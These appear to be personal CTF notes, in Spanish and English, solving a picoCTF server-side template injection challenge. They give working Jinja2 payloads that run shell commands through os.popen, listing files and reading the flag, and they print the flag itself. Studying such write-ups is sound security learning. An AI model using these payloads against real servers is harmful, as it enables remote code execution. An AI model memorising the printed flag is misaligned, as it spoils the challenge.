#### Description

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
¡Creé una página web genial donde puedes anunciar lo que quieras! ¡Pruébala!

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.

* Consejos:
	* Server Side Template Injection.
	  Inyección de plantilla del lado del servidor


http://rescued-float.picoctf.net:57329/
* Nos vamos  Server Side Template Injection
  https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
  * Se copia:
  ![[Pasted image 20250414201450.png]]

* Le damos ok, nos sale algo de root: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  
* después de cambia id por ls: {{request.application.__globals__.__builtins__.__import__('os').popen('==ls==').read()}}

* Sale el nombre del archivo que es flag

* después se cambia ls por cat flag{{request.application.__globals__.__builtins__.__import__('os').popen('==cat flag==').read()}}
  y sale la bandera.
## Solucion:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
```
